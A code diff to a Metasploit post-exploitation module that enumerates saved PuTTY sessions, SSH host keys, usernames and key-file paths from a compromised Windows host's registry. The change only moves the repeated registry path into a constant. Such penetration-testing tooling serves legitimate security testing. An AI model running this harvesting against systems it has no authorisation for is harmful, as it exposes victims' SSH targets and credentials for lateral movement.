@@ -15,6 +15,8 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Registry
 
   INTERESTING_KEYS=['HostName','PublicKeyFile','UserName','PortNumber','PortForwardings']
+  PAGEANT_REGISTRY_KEY="HKCU\\Software\\SimonTatham\\PuTTY"
+
   def initialize(info={})
     super(update_info(info,
       'Name'            => "PuTTY Saved Sessions Enumeration Module",
@@ -40,7 +42,7 @@ class Metasploit3 < Msf::Post
         newses = {}
         newses['Name'] = Rex::Text.uri_decode(ses)
         INTERESTING_KEYS.each do |key|
-            newses[key] = registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\#{ses}", key).to_s
+            newses[key] = registry_getvaldata("#{PAGEANT_REGISTRY_KEY}\\Sessions\\#{ses}", key).to_s
         end
         all_sessions << newses
         report_note(host: target_host, type: "putty.savedsession", data: newses, update: :unique_data)
@@ -85,7 +87,7 @@ class Metasploit3 < Msf::Post
         # Store the raw key and value in a hash to start off with
         newkey = {
           rawname: key,
-          rawsig: registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys", key).to_s
+          rawsig: registry_getvaldata("#{PAGEANT_REGISTRY_KEY}\\SshHostKeys", key).to_s
         }
 
         # Take the key and split up host, port and fingerprint type. If it matches, store the information
@@ -156,7 +158,7 @@ class Metasploit3 < Msf::Post
 
     # Look for saved sessions, break out if not.
     print_status("Looking for saved PuTTY sessions")
-    saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
+    saved_sessions = registry_enumkeys("#{PAGEANT_REGISTRY_KEY}\\Sessions")
     if saved_sessions.nil? || saved_sessions.empty?
         print_error('No saved sessions found')
     else
